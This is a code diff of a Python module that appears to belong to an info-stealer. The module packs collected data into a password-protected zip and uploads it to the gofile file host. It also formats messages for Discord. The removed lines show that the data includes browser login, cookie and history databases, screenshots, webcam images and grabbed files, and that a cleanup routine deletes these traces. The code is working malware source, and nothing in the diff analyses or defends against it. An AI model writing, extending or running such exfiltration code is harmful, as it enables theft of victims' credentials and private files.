@@ -12,11 +12,12 @@
 
 from shutil import make_archive,rmtree
 from requests import post, get
-from os import getenv,chdir,remove
+from os import chdir,remove, environ, sep
 from manager.logger import Log
 from random import randint
 from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
 from json import dumps
+from preferences.config import config
 
 def upload_file_to_gofile(file_path):
 	try:
@@ -35,7 +36,8 @@ def upload_file_to_gofile(file_path):
 		Log(f"gofile ---> {e}")
 		return None
 
-def MakeZip(local):
+def MakeZip(user):
+	Temp = environ['USERPROFILE'] + sep + r'AppData\Local\Temp'
 	dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
 	pwd_str = ""
 	name = ""
@@ -46,33 +48,21 @@ def MakeZip(local):
 	password = bytes(pwd_str, "UTF-8")
 	
 	try:
-		chdir(local)
-		make_archive(fr'{local}\logs', 'zip', fr'{local}\windll')
+		chdir(Temp)
+		make_archive(fr'{Temp}\logs', 'zip', f'{user}\\{config.pathToLogs}')
 		with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
 			logs.setpassword(password)
 			logs.write(r'logs.zip')
 		remove("logs.zip")
-		return[f"{local}/{name}.zip",pwd_str]
+		return[f"{Temp}/{name}.zip",pwd_str]
 	except Exception as e:
 		Log(f"MakeZip ---> {e}")
 		return None
 
 
-def Clean(local, roaming):
-	rmtree(rf'{local}\windll\File-Grubber', ignore_errors=True)
-	rmtree(rf'{local}\windll', ignore_errors=True)
-	try:
-		remove(rf'{local}\windll\sreenshot.jpg')
-		remove(rf'{local}\windll\webcam.png')
-	except:
-		pass
-	try:
-		remove(roaming+"/Loginvault.db")
-		remove(roaming+'/cookies.db')
-		remove(roaming+'/history.db')
-		remove(local+'/IconCache.db')
-	except:
-		pass
+def Clean(user):
+	rmtree(f'{user}\\{config.pathToLogs}\\Files\\File-Grubber', ignore_errors=True)
+	rmtree(f'{user}\\{config.pathToLogs}', ignore_errors=True)
 
 def MsgForDiscord(message, url):
 	message = message.replace('<b>', '**')
@@ -90,13 +80,12 @@ def MsgForDiscord(message, url):
 
 
 def Send(sendData, msgInfo):
-	local = getenv('LOCALAPPDATA')
-	roaming = getenv('APPDATA')
+	user = environ['USERPROFILE']
 	zipInfo = []
 	Log("===========Conclusion===========")
 
-	zipInfo = MakeZip(local)
-	Clean(local,roaming)
+	zipInfo = MakeZip(user)
+	Clean(user)
 	if zipInfo == None:
 		return
 
